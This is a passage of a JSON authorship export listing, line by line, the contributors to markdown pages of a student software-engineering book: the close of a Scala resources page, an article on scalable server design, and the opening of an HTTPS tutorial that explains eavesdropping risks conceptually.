        "content": ""
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "-"
        },
        "content": "A more detailed tutorial can be found here: [Tour of Scala](https://docs.scala-lang.org/tour/tour-of-scala.html)"
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "-"
        },
        "content": "Some useful resources are listed below if you want to learn more about Scala:"
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": "* [Scala Exercises](https://www.scala-exercises.org/) is a series of lessons and exercises created by 47 Degrees. "
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "-"
        },
        "content": "It\u0027s a great way to get a brief introduction to Scala while testing your knowledge along the way."
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": "* [Functional Programming Principles in Scala](https://www.coursera.org/course/progfun), free on Coursera. "
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "-"
        },
        "content": "This is a course about functional programming given by Martin Odersky himself. "
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "-"
        },
        "content": "You can access the course material and exercises by signing up for the course."
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [allaboutscala](https://allaboutscala.com/) provides detailed tutorials for beginners."
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "-"
        },
        "content": "More details can be find here: [Scala Learning Resources](https://scala-lang.org/documentation/learn.html)."
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "jamessspanggg": 2,
      "iskandarzulkarnaien": 12,
      "-": 224
    }
  },
  {
    "path": "contents/scalability/scalable-development.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Scalable Development - An Introduction"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Scalable Development - An Introduction"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: Loh Jia Shun Kenneth, Vivek Lakshmanan"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "## Scalable Development"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": "When Pokémon Go first launched in 2016, the heavy traffic from users caused its servers to crash as the server was built to handle an expected maximum of five times the average network traffic when in reality, it was fifty times that. However, as of 2017, Google handles at least 3.5 billion searches daily, Whatsapp handles at least 10 billion messages a day, and Facebook hosts 1.2 billion daily active users. What makes these companies different?"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "The key difference is their server infrastructure. A scalable server allows a company to provide reliable service even as the user base increases. Even if your service might not have to cater to millions of users at the moment, designing scalable software now will reduce the need to restructure the entire backend when the need arises."
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "## Scalability"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "So what is scalability? Scalability is the capacity to which a system can cope with an increased workload. Workload can refer to number of users on the server, number of files uploaded, number of concurrent requests, or any quantity that the system needs to scale for."
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Ways to Scale"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "Let\u0027s say you have a server running on a single host, but due to the growing number of users, it has been slowing down. What are the different ways you can speed it up?"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "### Horizontal vs Vertical Scaling"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "#### Horizontal Scaling"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "Horizontal scaling is simply buying more machines to host your server. This method can help improve scalability by a huge factor, as each additional unit of processing power and RAM costs the same, no matter how many machines you buy. As this is a promising way to increase scalability, it is no surprise why large services such as Google and Facebook use thousands of computer servers just to provide services to all their users."
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "However, to fully reap the benefits of multiple machines, you will need to learn various techniques to modify your server infrastructure. In most cases you cannot simply run multiple instances of the server and expect it to work."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "Here are some tips to get started with horizontal scaling:"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- Understand [Parallel Computing](https://web.eecs.umich.edu/~qstout/parallel.html) and how to use it to speed up computation. "
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "- Learn how to utilize MapReduce on [Hadoop](https://www.tutorialspoint.com/hadoop/index.htm). The Hadoop ecosystem is so versatile and widely-used that there are companies offering Hadoop as a service, so you do not have to set up the server yourself."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "- Host your server on [Google App Engine](https://cloud.google.com/appengine/docs). Despite being more expensive than Amazon Web Services and DigitalOcean, it offers very scalable infrastructure for your server."
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "- Run a server with multiple nodes with MPI. [Open MPI](https://www.open-mpi.org) is an open source message-passing library that can be used to send data between the nodes in your server. You might have to study [cloud computing infrastructure](http://whatiscloud.com/basic_concepts_and_terminology/it_resource) in order to make use of this."
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- Study various scalable architecture for servers ([resource](https://srinathsview.blogspot.sg/2011/10/list-of-known-scalable-architecture.html))."
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "#### Vertical Scaling"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "This is arguably the easiest way to speed up your server, as it is a general solution to most problems. Simply get faster CPUs, larger RAM, etc. This is called vertical scaling. If you get multi-core processors, use threading in your server to allow parallelization of certain processes to take advantage of the cores."
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "However, due to Amdahl\u0027s law, each additional processor will give a less-than-proportionate speed up. Coupled with the exponential increase in price as the computing power of the CPU increases, this is typically not scalable in the long run."
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Should You Choose One or the Other?"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "With vertical scaling, you get to take advantage of processing power and concurrency. But as mentioned above, this isn\u0027t sustainable over the long run because it: "
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "1. Results in a single point of failure. "
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "1. Prevents changes to be made to the code without bringing the entire system down."
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "1. Hinders the ability to distribute your application geographically. "
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "You can solve these issues with horizontal scaling. But with horizontal scaling alone, what each machine can do will be much lesser than with vertical scaling. As a result, it\u0027s fairly hard to choose between the two and in the end, it boils down to using both horizontal and vertical scaling in order to achieve optimal performance. "
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "### Faster Algorithms"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "If you have computationally-intensive functions, making them faster can help save a lot of time. For instance, if you want to look up files stored with a certain tag, a hashtable can be used to store files under commonly-searched tags, as opposed to a linear search. The difference between O(1) and O(n) increases as the number of files on a server increases."
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "In certain scenarios, the runtime complexity can be reduced as a trade-off between time and accuracy. For example, if you want to figure out the type of content a user wants to see on a social network, rather than analyze the user\u0027s past history of posts liked, you can just sample the 100 most recent posts liked by the user and analyze them."
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "### Avoid Bottlenecks"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "There are a few common bottlenecks that can be avoided such as database querying, reading or writing to files and slow communication across network. Different bottlenecks can be solved with their respective solutions. Here are some ways to avoid bottlenecks."
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "#### Caching"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "With an increasing user base, your server has to deal with a larger number of requests along with the bottlenecks mentioned previously such as network congestion and database querying. As a result, the response becomes slower. This is where [caching](https://www.lecloud.net/post/9246290032/scalability-for-dummies-part-3-cache) comes in. A cache is a key-value store that resides between the application and the database which can either be in the browser or part of your server infrastructure itself. By retrieving data from the cache instead of the database, the data is retrieved locally (either from the browser or web server) instead of remotely from a database. Simply put, data is retrieved from a closer location and as a result, the response time reduces greatly."
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "The next thing to consider is [what to cache](https://www.infoq.com/articles/ebay-scalability-best-practices). The rule of thumb is to cache data that is:"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "1. Frequently accessed."
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "1. Read more often than it is updated. "
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "With this, cache hits would be more often than cache misses and as a result, the time saved from faster accesses and reads outweighs the extra time taken to populate the cache.  "
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "#### Sharding "
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "As your traffic increases your data increases as well and as a result, your database gets overloaded. One way to mitigate this is to scale your database by sharding. [Sharding](https://stackoverflow.com/questions/992988/what-is-sharding-and-why-is-it-important) is a method of splitting and storing a single logical dataset in multiple databases. More specifically, it is the storing of data horizontally - storing rows of a same table in multiple database nodes instead of storing them in the usual vertical way - storing different tables \u0026 columns in a separate database."
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "The [benefits of Sharding](https://medium.com/@jeeyoungk/how-sharding-works-b4dec46b3f6) include:"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "* Sharding allows you to store more data - Sharding is essential when your dataset becomes too large to store in a single database. It reduces the number of rows in each table and as such improves search performance since the search is done on a smaller table. "
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "* Sharding allows for quicker query response time - Querying the databases containing only the relevant partitions becomes possible as well. For instance, if a database contains a column for age, you can partition the rows according to an age group and store them in different databases. Whenever there is a need to access the data of a particular age group, instead of querying the whole database, you just need to query the partition that contains that age group. This allows your database to scale along with your data and traffic growth."
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "#### Go Asynchronous "
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "Unlike synchronous operations that run sequentially and wait for previous operations to complete, [asynchronous operations](https://www.youtube.com/watch?time_continue\u003d2\u0026v\u003d8aGhZQkoFbQ) do not block further execution and as a result, other operations do not have to wait."
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "In situations in which responding to request is crucial, asynchronous operations can reduce the latency experienced by the requester and thereby avoid that bottleneck by prioritising the quickness of the response to the user over the speed of other processes such as execution latency (how quickly the request is processed). For instance, rather than waiting for some processes such as downloading the requested file to finish, it\u0027s better to asynchronously update the user interface and then finish these processes. In this way, the user experiences lesser latency since the user interface is updated instantly instead of appearing to have crashed due to waiting for the downloaded file."
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "You can use the many program profilers available to find such [common bottlenecks](https://www.apicasystem.com/blog/5-common-performance-bottlenecks) in your server, thereby potentially saving huge amounts of time."
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## But Wait!"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "Before you start tweaking your server to make it scalable, be sure to avoid the following pitfalls:"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "- Premature or unnecessary optimization: a tiny performance improvement that can make your code hard to understand later on is not worth it."
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "- Optimizing without profiling performance: optimizing the function that takes up 1% of the delay will not improve a lot."
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "- Forget the product: if there is no product, then scaling your server to handle a million users is a moot point."
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "Use the following tips to avoid those pitfalls:"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "- Structure the code so that it will be easy to scale up. For instance if you know a portion of your code can be implemented with MapReduce, code it so that it follows the MapReduce structure."
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "- Implement code that is easy to understand. If your \"smart\" tweak saves you half a millisecond makes your code hard to understand, then it probably is a premature optimization."
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "- Always profile your program\u0027s performance first. Be sure to find out what is causing a huge slowdown, then optimize that portion."
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "- Test if your improvement actually speeds up the runtime in practice."
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "- If trying to optimize a certain portion to run slightly faster will take you a few days, avoid that. Find a balance between delivering the product or features, and scalability."
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "## Conclusion"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "There is a huge gap between theory and practice. What looks well on paper might need tweaking with arbitrary constants and \"hacks\". As such, more research should be done before you implement any of the solutions."
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "However, scalability will still be a crucial part of servers aiming to provide services to an increasingly-growing user base. Learning good scalability practices will help prevent developing a server that will never be able to scale. Take the time to explore the depths of scalability, and you will be able help your server scale to meet its demand."
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 3,
      "jamessspanggg": 3,
      "-": 108
    }
  },
  {
    "path": "contents/security/Https.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Security - https"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Security - https"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: [Boxin][1]"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Overview‎](#overview)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Why do we need HTTPS‎](#why-do-we-need-https)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Why HTTPS is secure‎](#why-https-is-secure)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [How to set up HTTPS‎](#how-to-set-up-https)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Misuse of HTTPS‎](#misuse-of-https)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Conclusion‎](#conclusion)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "## Overview"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "HTTPS is the end-to-end encryption on data on top of HTTP to prevent network sniffing (eavesdropping data packets). In this tutorial, we will cover four questions to have a better understanding of https. The questions are:"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "- [Why do we need HTTPS](#why-do-we-need-https)"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "- [Why HTTPS is secure](#why-https-is-secure)"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "- [How to set up HTTPS](#how-to-set-up-https)"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "- [Misuse of HTTPS](#misuse-of-https)"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Why Do We Need HTTPS?"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "The web application usually runs over IP network, which is vulnerable to network sniffing. The old HTTP transmits data packets in plain text and if the network is sniffed, the sniffer can see confidential information in the data packets such as the password or [session tokens][2]. Here are some examples on how a plain text could be sniffed."
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "- On public free wifi, a Wifi adapter in monitor mode would be able to capture all the ongoing packets to and from the wifi access point, regardless of its destination. If the traffic is transmitted over HTTP, the data sent over wifi is in plain text and the session token and password can be stolen. One famous example would be [Firesheep][3], a Firefox plugin to sniff session token used in websites such as Facebook. This has made Facebook [change its default protocol from HTTP to HTTPS][4]"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "- Our network packets usually travel through switches and routers around the globe to reach the destination. Any one of them, if compromised, could expose our network traffic to the sniffer. [Network tap][5] is an example of a device used to sniff network traffic."
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "- Our Internet architecture relies on [DNS][6] for domain name and IP mapping and [ARP][7] for MAC address and IP mapping. None of the above is built with security in mind. Common attacks such as [DNS cache poisoning][8] or [ARP poisoning][9]"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "could redirect your traffic for monitoring."
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "All in all, the Internet architecture that we rely on for network transmission is very vulnerable to network sniffing. If we were to use HTTP, which transmits packets in plain text, no confidentiality could be guaranteed for our web application. Therefore, we need to use HTTPS as an end to end encryption to secure our network packets."
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Why Is HTTPS Secure?"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "As aforementioned, our network is not secure, so how could HTTPS help? HTTPS is built on top of HTTP with the addition of [SSL][10] to encrypt the plain text message. The purpose of this encryption is to make sure only client and the server could decrypt the message with required keys, and sniffer cannot decrypt packets even though they may sniff packets."
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "There are mainly 3 encryption algorithms used in HTTPS, namely RSA, Diffie Hellman and Elliptic Curve Algorithm. They are more thoroughly explained in [Introduction to Cryptography][11] section. These algorithms prevent sniffers from decrypting packets without knowing the keys used because the best attack algorithms known at the moment run in [sub-exponential][12] time. Therefore, the attack is believed to be computationally infeasible when the keysize is large enough (e.g. 2048 bits for RSA), though it is not mathematically proven."
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "Thus, by using https, we can be sure that even though our network packets are transmitted over an insecure network, sniffers cannot understand the content of our encrypted packets."
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "Besides providing secure network traffic, HTTPS also provides server validation through Certificate Authority (CA) architecture. A detailed explanation on CA is [here][13] . In short, CA works by issuing the server a digital certificate that can only be produced by CA. When the server sends its digital certificate to the client, client browsers verify the digital certificate with CA to check whether the server is indeed the intended server. To obtain such digital certificate, the server needs to apply to CA and CA will verify the server before issuing the digital certificate."
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### How to Set up HTTPS?"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "In order set up HTTPS on your server, you would need to have:"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "1. A dedicated IP address for your server."
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "2. Obtain a digital certificate from a CA."
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "For example, one of the CA is [digicert][14] and they provide SSL [installation guide][15] for different platforms. Usually, the SSL setup could be found on the CA that you obtained a digital signature from."
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "However, most CAs are not free of charge. One free initiative to provide free domain validation certificates is [Lets Encrypt][16]."
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "## Misuse of HTTPS"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "Up to this moment, it seems that nothing could go wrong with HTTPS. However, in real life, there could be weakness on the implementation of HTTPS."
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "#### SHA-1 Collision Attack"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
